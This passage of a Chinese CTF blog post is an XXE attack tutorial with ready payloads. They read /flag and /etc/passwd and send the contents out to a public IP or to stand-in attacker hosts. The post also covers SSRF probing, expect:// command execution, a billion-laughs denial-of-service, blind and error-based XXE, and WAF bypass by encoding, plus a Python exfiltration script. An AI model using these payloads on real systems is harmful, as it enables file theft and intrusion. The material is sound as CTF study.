+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;175.178.196.226&#x2F;xxxget.php?1&#x3D;%file;&#39;&gt;&quot;&gt;
+%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<p>使用php伪协议读取flag，再在公网服务器中建一个php文件，来接受数据，同时这里面使用了嵌套实体(不懂为什么要使用)，不用就得不到flag<img src="/images/image-20220912095339306.png" alt="image-20220912095339306"></p>
+<p>发现用户名会显示，抓包发现以xml的形式传输</p>
+<p><img src="/images/image-20220912095417645.png" alt="image-20220912095417645"></p>
+<p>思路：修改username的内容，然后进行输出：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE xxe [
+&lt;!ENTITY a SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
+]&gt;
+&lt;binbin&gt;
+&lt;username&gt;&amp;a;&lt;&#x2F;username&gt;
+&lt;password&gt;1&lt;&#x2F;password&gt;
+&lt;&#x2F;binbin&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/image-20220912095544692.png" alt="image-20220912095544692"></p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p> XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议 </p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;internal.service&#x2F;secret_pass.txt&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>当然也可以用来探测端口信息，根据响应包的信息，若非“connection refused”则表示该端口可能是开放的。</p>
+<p>众所周知，有些企业对内网的安全性可能不那么注重。除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用ncat工具进行测试。关于ncat的使用：ncat-网络工具中的‘瑞士军刀’</p>
+<p>用ncat在自己的服务器上开启监听：ncat -lvkp 8081(端口可自定义)</p>
+<p>之后便可使用以下语句尝试是否能够建立连接：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  &lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;ATTACKERIP:8081&#x2F;&quot; [  &lt;!ELEMENT data (#PCDATA)&gt;  ]&gt;&lt;data&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如果能够建立连接，那么服务器端的ncat会收到相应的请求信息。</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p> 在安装expect扩展的PHP环境里执行系统命令，当然其他协议也有可能可以执行系统命令 </p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h3><p> 支持实体测试： </p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">></span> <span class="token operator">&lt;</span>!DOCTYPE lolz <span class="token punctuation">[</span> <span class="token operator">&lt;</span>!ENTITY lol <span class="token string">"lol"</span><span class="token operator">></span> <span class="token operator">&lt;</span>!ELEMENT lolz <span class="token punctuation">(</span><span class="token comment">#PCDATA)> &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"> &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"> &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;">...... &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;">]>&lt;lolz>&amp;lol9;&lt;/lolz></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="带外"><a href="#带外" class="headerlink" title="带外"></a>带外</h3><p>带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。但有些情况下不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>
+<p>将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;remotevps&#x2F;evil.xml&quot;&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>evil.xml：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;remotevps&#x2F;1.php?file&#x3D;%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>实体remote，all，send的引用顺序很重要，首先对remote引用目的是将外部文件evil.xml引入到解释上下文中，然后执行%all，这时会检测到send实体，在root节点中引用send，就可以成功实现数据转发。当请求发送以后，攻击者的服务器上就能查看到1.txt中的内容。</p>
+<p> 基于错误的XXE<br>形同blind xxe，当我们成功地让服务端解析了xml文档，得到的响应却是通用的。比如添加账号的时候只返回“添加成功”这样的响应。此时我们可以让服务器响应报错信息来得到我们要的敏感数据。</p>
+<p>有两种报错的来源：</p>
+<p>DTD结构的错误<br>XML架构验证时的错误<br>外部DTD</p>
+<p>在本例中，我们将让服务器加载一个恶意DTD，它将在错误消息中显示文件的内容(只有当可以看到错误消息时，这才有效)。</p>
+<p>可以使用恶意的外部DTD触发包含&#x2F;etc&#x2F;passwd文件内容的XML解析错误消息，如下所示:</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt;%eval;%error;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个DTD执行以下步骤:</p>
+<p>定义一个名为file的XML参数实体，其中包含&#x2F;etc&#x2F;passwd文件的内容。</p>
+<p>定义一个名为eval的XML参数实体，包含另一个名为error的XML参数实体的动态声明。<strong>错误实体将通过加载一个不存在的文件来评估，该文件的名称包含文件实体的值</strong>。</p>
+<p>使用eval实体，该实体将导致执行错误实体的动态声明。</p>
+<p>使用错误实体，以便通过尝试加载不存在的文件来得到数据，从而导致返回包含不存在文件的名称的错误消息，该名称正是&#x2F;etc&#x2F;passwd文件的内容。</p>
+<p>实例演示：<br><img src="/images/008i3skNgy1gsg90v59jcj311t0a7wja.jpg" alt="img"> </p>
+<p> 请注意，外部DTD允许我们在第二个(eval)中包含一个实体，但在内部DTD中是禁止的。因此，在不允许使用外部DTD的情况下(通常)强制执行错误是行不通的。 </p>
+<h3 id="内外部DTD混合"><a href="#内外部DTD混合" class="headerlink" title="内外部DTD混合"></a>内外部DTD混合</h3><p>那么，当带外交互被阻止(外部连接不可用)时， blind XXE漏洞怎么办?</p>
+<p>在这种情况下，由于XML语言规范中的漏洞，仍然有可能触发包含敏感数据的错误消息。如果文档的DTD混合使用内部和外部DTD声明，那么内部DTD可以重新定义在外部DTD中声明的实体。当发生这种情况时，在另一个参数实体的定义中使用XML参数实体的限制就放宽了。</p>
+<p>这意味着攻击者可以从内部DTD中使用基于错误的XXE技术，前提是他们使用的XML参数实体是重新定义在外部DTD中声明的实体。当然，如果带外连接被阻塞，那么就不能从远程位置加载外部DTD。相反，它需要是应用服务器本地的外部DTD文件。从本质上说，攻击涉及调用碰巧存在于本地文件系统上的DTD文件，并将其重新用于重定义现有实体，从而触发包含敏感数据的解析错误。</p>
+<p>例如，假设服务器文件系统上位于位置&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.上有一个DTD文件这个dtd文件定义了一个名为custom_entity的实体。攻击者可以通过提交如下混合DTD来触发包含&#x2F;etc&#x2F;passwd文件内容的XML解析错误消息:</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [    
+    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd&quot;&gt;    
+    &lt;!ENTITY % custom_entity &#39;&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; 
+            &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; 
+        &amp;#x25;eval;        
+        &amp;#x25;error;&#39;&gt;    
+    %local_dtd;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个DTD执行以下步骤:<br>定义名为local_dtd的XML参数实体，其中包含存在于服务器文件系统上的外部DTD文件的内容。<br>重新定义名为custom_entity的XML参数实体，该实体已经在外部DTD文件中定义。实体被重新定义为包含前面描述的基于错误的XXE漏洞，用于触发包含&#x2F;etc&#x2F;passwd文件内容的错误消息。<br>使用local_dtd实体，以便解释外部DTD，包括重新定义的custom_entity实体的值。这将导致所需的错误消息。<br>现实世界的例子:使用GNOME桌面环境的系统通常有一个DTD在&#x2F;usr&#x2F;share&#x2F;yelp&#x2F; DTD &#x2F;docbookx包含名为ISOamso的实体的dtd。</p>
+<p> <img src="/images/fe48346aa420f04b034deb4bd532608a.png" alt="img"> </p>
+<p>由于该技术使用内部DTD，所以首先需要找到一个有效的DTD。你可以安装相同的服务器正在使用的操作系统&#x2F;软件和搜索一些默认dtd，或抓取系统内的默认dtd列表，并检查其中是否存在。</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;%local_dtd;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+url<span class="token operator">=</span><span class="token string">"http://23c06661-6db4-492b-8882-7a9aa6c5c34d.challenge.ctf.show/"</span>
+data<span class="token operator">=</span><span class="token triple-quoted-string string">'''&lt;!DOCTYPE  xxe [
+&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
+&lt;!ENTITY % xee SYSTEM "http://175.178.196.226/xxe.dtd">
+%xee;
+%send;
+]>
+&lt;root>
+&lt;/root>'''</span>         <span class="token comment">#js代码</span>
+requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#requests.post(url,data=data.encode('utf-7'))</span>
+<span class="token comment">#requests.post(url,data=data.encode('utf-16BE'))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编码绕过<br>base64</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;&lt;foo&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>仅当XML服务器接受data:&#x2F;&#x2F;协议时，此方法才有效。</p>
+<p>utf-7<br>直接上样例：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-7&quot;?--&gt;+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-&#x2F;etc&#x2F;passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-&#x2F;productId+AD4-+ADw-storeId+AD4-1+ADw-&#x2F;storeId+AD4-+ADw-&#x2F;stockCheck+AD4-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用两种编码<br>思路是在同一个文档里同时使用两种编码，从而迷惑 WAF。直接用生成的命令来说明：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">echo -n &#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-16BE&quot;?&gt;&#39; &gt; payload.xmlecho &#39;&lt;a&gt;1337&lt;&#x2F;a&gt;&#39; | iconv -f UTF-8 -t UTF-16BE &gt;&gt; payload.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>头部声明使用 UTF-8 编码，而之后使用 UTF-16 编码。当解析器读到 XML 声明的编码时，会切换到该编码（继续解析），即使该编码与声明部分所使用的编码不同。与此同时，WAF 一般不支持这种多种编码的 XML 文档。</p>
+<p>在实体内编码<br>是新的XML技术，对内部实体中的任何DTD&#x2F;XML进行编码（编码格式是字符串16进制+UTF-8形式），达到WAF bypass的效果！<br>当没有XXE，但XML主体中存在漏洞(例如SQL注入)时起作用。</p>
+<p> <img src="/images/01c50cfefa302534c320fa876f854f8f.png" alt="img"> </p>
+<p>文档中的额外空格<br>由于XXE通常在XML文档的开头，所以比较省事儿的WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在<?xml?>或&lt;!DOCTYPE&gt;中插入额外的空格，从而绕过此类WAF。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Aurorabin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://zeobi.github.io/2022/09/12/xxe/">http://zeobi.github.io/2022/09/12/xxe/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Aurorabin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/ctfshow/">
+                                    <span class="chip bg-color">ctfshow</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">网络乞讨</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/09/13/flask-suan-pin-zhi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="flask算PIN值">
+                        
+                        <span class="card-title">flask算PIN值</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-09-13
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Aurorabin
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctfshow/">
+                        <span class="chip bg-color">ctfshow</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/09/11/fan-dan-shell/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="反弹shell">
+                        
+                        <span class="card-title">反弹shell</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Aurorabin
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctfshow/">
+                        <span class="chip bg-color">ctfshow</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">Aurorabin</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/zeobi" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:877199409@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=877199409" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 877199409" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
